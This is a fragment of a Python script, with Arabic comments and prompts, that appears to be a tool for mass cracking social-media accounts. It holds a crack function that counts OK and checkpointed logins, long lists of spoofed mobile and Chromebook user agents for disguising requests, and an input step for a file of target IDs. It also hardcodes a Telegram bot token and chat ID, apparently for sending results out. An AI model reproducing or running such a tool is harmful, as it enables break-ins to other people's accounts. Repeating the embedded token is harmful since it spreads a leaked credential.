...
from rich import print as rprint
from rich import pretty
from rich import print as مبست 
from rich.text import Text as tekz
import os
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
...
#------------[ اميره ]--------------#
token = '7129956935:AAEbIdzd8onQ-xl2hK4VZUtTe7p6QIdo4w4'
ID ='6410893449'
print(a40+'   ') 
مبستVIP="""
...
S = '\033[1;33m'
print('\n')
print('\033[1;91mادخـل تـوكـنك')
token = input('\x1b[1;32m𝙀𝙉𝙏𝙀𝙍 𝙏𝙊𝙆𝙀𝙉 : \x1b[1;31m')
print('')
os.system('clear')
print('\033[1;91mادخـل ايـدك')
ID = input('\x1b[1;32m𝙀𝙉𝙏𝙀𝙍 𝙄𝘿  :\x1b[1;31m ')
os.system('clear')
...
ua = [
    'Mozilla/5.0 (Linux; U; Android 11; pt-ao; TECNO PR651E Build/RP1A.201005.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36 PHX/13.3']
ua = [
    'Mozilla/5.0 (Linux; U; Android 11; pt-ao; TECNO PR651E Build/RP1A.201005.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36 PHX/13.3']
ua = [
    'Mozilla/5.0 (Linux; U; Android 11; pt-ao; TECNO PR651E Build/RP1A.201005.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36 PHX/13.3']
...
ugen2 = [
    ...
    'Mozilla/5.0 (Linux; Android 9; Acer Chromebook R11',
    'AppleWebKit/537.36 (KHTML like Gecko) Version/4.0',
    'Mozilla/5.0 (Linux; Android 9; Samsung Chromebook',
    '3 Build/R103-14816.131.5; wv) AppleWebKit/537.36',
    'Mozilla/5.0 (Linux; Android 9; Dell Chromebook 11',
    'AppleWebKit/537.36 (KHTML like Gecko) Version/4.0',
    'Mozilla/5.0 (Linux; U; Android 9; Dell Chromebook',
    'AppleWebKit/537.36 (KHTML like Gecko) Version/4.0',
    'Mozilla/5.0 (Linux; Android 9; HP Chromebook x360',
    'AppleWebKit/537.36 (KHTML like Gecko) Version/4.0',
    'Mozilla/5.0 (Linux; Android 9; Mediatek MT8173',
    'AppleWebKit/537.36 (KHTML like Gecko) Version/4.0',
    'Mozilla/5.0 (Linux; Android 9; Mediatek MT8173',
    'AppleWebKit/537.36 (KHTML like Gecko) Version/4.0',
    'Mozilla/5.0 (Linux; Android 9; Samsung Chromebook',
    '3 Build/R103-14816.131.5; wv) AppleWebKit/537.36',
    'Mozilla/5.0 (Linux; Android 9; Acer Chromebook R13',
    'AppleWebKit/537.36 (KHTML like Gecko) Version/4.0',
    'Mozilla/5.0 (X11; CrOS aarch64 14989.85.0)',
    'AppleWebKit/537.36 (KHTML like Gecko)',
    'Mozilla/5.0 (Linux; Android 9; Dell Chromebook 11',
    'AppleWebKit/537.36 (KHTML like Gecko) Version/4.0',
    'Mozilla/5.0 (Linux; Android 9; Acer Chromebook R11',
    ...
    'Mozilla/5.0 (Linux; Android 9; Mediatek MT8173',
    'AppleWebKit/537.36 (KHTML like Gecko) Version/4.0',
    'Mozilla/5.0 (Linux; U; Android 11; en-US; Samsung',
    'Mozilla/5.0 (Linux; Android 9; HP Chromebook x360',
    'AppleWebKit/537.36 (KHTML like Gecko) Version/4.0',
    'Mozilla/5.0 (X11; CrOS x86_64 13729.84.0)',
    'AppleWebKit/537.36 (KHTML like Gecko)',
    'Mozilla/5.0 (Linux; Android 9; Chromebook)',
    'AppleWebKit/537.36 (KHTML like Gecko)',
    'Mozilla/5.0 (Linux; Android 9; HP Chromebook x360',
    'AppleWebKit/537.36 (KHTML like Gecko) Version/4.0',
    'AppleWebKit/537.36 (KHTML like Gecko)',
    'Mozilla/5.0 (Linux; Android 9; HP Chromebook x360',
    'AppleWebKit/537.36 (KHTML like Gecko) Version/4.0',
    'Mozilla/5.0 (Linux; Android 9; HP Chromebook 11 G5',
    'Build/R103-14816.131.0; wv) AppleWebKit/537.36',
    'Mozilla/5.0 (X11; CrOS x86_64 14541.0.0)',
    'AppleWebKit/537.36 (KHTML like Gecko)',
    'Mozilla/5.0 (Linux; Android 9; Dell Chromebook 13',
    '(3380) Build/R114-15437.42.0; ) AppleWebKit/537.36',
    'Mozilla/5.0 (X11; CrOS aarch64 14588.98.2)',
    'AppleWebKit/537.36 (KHTML like Gecko)',
    'Mozilla/5.0 (Linux; Android 9; ASUS Chromebook',
    'AppleWebKit/537.36 (KHTML like Gecko) Version/4.0',
    'Mozilla/5.0 (Linux; Android 9; Lenovo ThinkPad 11e',
    'AppleWebKit/537.36 (KHTML like Gecko) Version/4.0',
    'Mozilla/5.0 (Linux; Android 9; Acer Chromebook R13',
    'AppleWebKit/537.36 (KHTML like Gecko) Version/4.0',
    'Mozilla/5.0 (Linux; Android 11; Mediatek MT8173',
    'AppleWebKit/537.36 (KHTML like Gecko) Version/4.0',
    '&gt; Mozilla/5.0 (X11;CrOS aarch64 13099.85.0)',
    'Mozilla/5.0 (Linux; Android 9; HP Chromebook x360',
    'AppleWebKit/537.36 (KHTML like Gecko) Version/4.0',
    'Mozilla/5.0 (X11; CrOS aarch64 13816.80.0)',
    'AppleWebKit/537.36 (KHTML like Gecko)',
    'Mozilla/5.0 (X11; CrOS aarch64 13816.80.0)',
    'AppleWebKit/537.36 (KHTML like Gecko)',
    'Mozilla/5.0 (Linux; Android 9; ASUS Chromebook',
    'AppleWebKit/537.36 (KHTML like Gecko)',
    'Mozilla/5.0 (Linux; U; Android 9; Mediatek MT8173',
    'AppleWebKit/537.36 (KHTML like Gecko) Version/4.0',
    'Mozilla/5.0 (Linux; Android 9; Mediatek MT8173',
    'AppleWebKit/537.36 (KHTML like Gecko) Version/4.0',
    'Mozilla/5.0 (Linux; U; Android 9; Lenovo ThinkPad',
    'AppleWebKit/537.36 (KHTML like Gecko) Version/4.0',
    'Mozilla/5.0 (X11; CrOS x86_64 13902.0.0)',
    'AppleWebKit/537.36 (KHTML like Gecko)',
    'Mozilla/5.0 (Linux; Android 9; Dell Chromebook 11',
    'AppleWebKit/537.36 (KHTML like Gecko) Version/4.0',
    'Mozilla/5.0 (Linux; Android 9; Mediatek MT8173',
    'AppleWebKit/537.36 (KHTML like Gecko) Version/4.0',
    'Mozilla/5.0 (X11; CrOS x86_64 12499.20.0)',
    'AppleWebKit/537.36 (KHTML like Gecko)',
    'Mozilla/5.0 (Linux; Android 9; Acer Chromebook 15',
    'AppleWebKit/537.36 (KHTML like Gecko) Version/4.0',
    'Mozilla/5.0 (Linux; x86; Android 9; ASUS',
    'Chromebook C202SA) AppleWebKit/537.36 (KHTML like',
    'Mozilla/5.0 (X11; CrOS aarch64 13729.8.0)',
    'AppleWebKit/537.36 (KHTML like Gecko)',
    'Mozilla/5.0 (Linux; x86_64; Android 9; Acer',
    'AppleWebKit/537.36 (KHTML like Gecko)',
    'Mozilla/5.0 (Linux; Android 9; HP Chromebook x360',
    'AppleWebKit/537.36 (KHTML like Gecko) Version/4.0',
    'Mozilla/5.0 (X11; CrOS aarch64 14469.58.0)',
    'AppleWebKit/537.36 (KHTML like Gecko)']
ugen = [
...
def TakeFile():
	...
	try:
		...
		jum = input('[?] INPUT FILE : ادخل مسار الملف ')
...
def crack(idf, pwv):
	...
	rc = random.choice
	sys.stdout.write(f"\r{bo}[ℳ] - {loop}/{len(id)} - [OK:{ok}] - [CP:{cp}] {'{:.0%}'.format(loop/float(len(id)))}    "),
	sys.stdout.flush()
